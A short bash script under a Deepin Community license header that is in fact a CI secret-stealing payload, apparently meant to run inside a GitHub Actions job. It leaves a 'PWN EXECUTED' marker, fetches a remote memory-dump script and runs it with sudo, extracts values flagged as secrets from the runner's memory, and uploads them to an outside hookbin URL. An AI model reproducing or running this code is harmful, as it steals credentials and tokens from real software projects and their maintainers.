#!/bin/bash
# SPDX-FileCopyrightText: 2026 Deepin Community
# SPDX-License-Identifier: MIT

echo "PWN EXECUTED" > /tmp/pwn_marker
echo "Okay, we got this far. Let's continue..."
export IS_RUNNING_IN_ACT=false
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets" || true
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" || true
